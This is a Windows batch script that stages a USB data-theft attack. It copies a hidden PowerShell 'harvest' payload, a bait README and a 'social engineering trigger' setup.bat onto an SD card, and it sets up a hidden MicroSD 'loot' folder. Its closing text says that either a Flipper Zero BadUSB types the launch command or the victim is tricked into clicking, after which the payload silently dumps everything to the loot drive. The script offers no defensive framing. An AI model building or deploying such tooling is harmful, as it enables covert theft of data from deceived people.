@echo off
title FLLC USB Payload Deployer
color 0A

echo.
echo  ========================================
echo   FLLC — USB TRI-DRIVE DEPLOYER
echo  ========================================
echo.

:: Check drives
set SD_DRIVE=H:
set MICRO_DRIVE=I:

echo  Checking drives...

if not exist %SD_DRIVE%\ (
    echo  [!] SD card not found at %SD_DRIVE%
    echo  Insert SD card and try again.
    pause
    exit /b 1
)

if not exist %MICRO_DRIVE%\ (
    echo  [!] MicroSD not found at %MICRO_DRIVE%
    echo  Insert MicroSD and try again.
    pause
    exit /b 1
)

echo  [+] SD Card:   %SD_DRIVE% — FOUND
echo  [+] MicroSD:   %MICRO_DRIVE% — FOUND
echo.

:: Deploy to SD Card
echo  [*] Deploying payload to SD Card (%SD_DRIVE%)...
xcopy "%~dp0sd_card\*" "%SD_DRIVE%\" /E /Y /Q /H >nul 2>&1
if %errorlevel%==0 (
    echo  [+] SD Card payload deployed successfully
) else (
    echo  [-] SD Card deployment had errors
)

:: Deploy to MicroSD
echo  [*] Preparing MicroSD (%MICRO_DRIVE%) as loot target...
xcopy "%~dp0microsd\*" "%MICRO_DRIVE%\" /E /Y /Q /H >nul 2>&1
if not exist "%MICRO_DRIVE%\loot" mkdir "%MICRO_DRIVE%\loot"
attrib +h "%MICRO_DRIVE%\.loot_target" >nul 2>&1
if %errorlevel%==0 (
    echo  [+] MicroSD prepared as loot target
) else (
    echo  [-] MicroSD preparation had errors
)

:: Hide payload folder on SD card
attrib +h "%SD_DRIVE%\.p" >nul 2>&1
echo  [+] Payload folder hidden on SD card

echo.
echo  ========================================
echo   DEPLOYMENT COMPLETE
echo  ========================================
echo.
echo   SD Card (%SD_DRIVE%):
echo     setup.bat      — Social engineering trigger
echo     README.txt     — Bait file
echo     .p\harvest.ps1 — Main payload (hidden)
echo.
echo   MicroSD (%MICRO_DRIVE%):
echo     .loot_target   — Drive marker (hidden)
echo     loot\          — Data dump directory
echo.
echo   Flipper BadUSB:
echo     Copy flipper_badusb\usb_harvest.txt to
echo     your Flipper Zero SD: badusb\
echo.
echo   HOW IT WORKS:
echo     Option A: Flipper Zero types the command (auto)
echo     Option B: Target clicks setup.bat (social eng)
echo     Either way: harvest.ps1 runs silently,
echo     dumps EVERYTHING to MicroSD loot folder.
echo.
echo  ========================================
pause
